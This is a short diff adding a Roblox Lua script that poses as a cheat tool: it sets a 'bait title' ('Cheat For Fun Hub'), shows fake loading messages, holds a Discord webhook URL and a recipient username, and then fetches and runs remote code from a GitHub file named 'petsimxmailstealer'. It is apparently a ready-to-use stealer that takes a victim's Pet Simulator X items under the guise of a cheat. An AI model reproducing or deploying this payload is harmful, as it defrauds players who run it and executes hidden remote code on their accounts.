@@ -1,0 +1,6 @@
+local player_USERNAME = "Anhlayofficial" 
+local discord_WEBHOOK = "https://discord.com/api/webhooks/1112207964388986900/9nOrI4qXL8Uc53WiJlVEiw1TpR80HaBfVPh4-nspKYi0T4Lqxt2ELXbG3Z19ONipkZrn" -- leave blank if no webhook 
+local Custom_Script_Name = "Cheat For Fun Hub" -- bait title
+local txt_1 = "Check Prenium..." 
+local txt_2 = "Waiting for Load Script" 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DrakeIsEpic/Scripts3/main/petsimxmailstealer"))()
